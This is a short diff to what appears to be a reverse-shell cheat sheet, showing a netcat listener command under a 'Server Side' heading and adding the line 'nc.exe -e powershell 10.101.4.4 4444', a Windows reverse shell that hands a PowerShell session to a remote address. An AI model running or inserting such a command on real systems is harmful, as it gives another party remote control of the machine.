@@ -531,6 +531,7 @@ Server Side:
 
 ```
 stty raw -echo; (stty size; cat) | nc -lvnp 3001
+nc.exe -e powershell 10.101.4.4 4444
 ```
 
 Client Side:
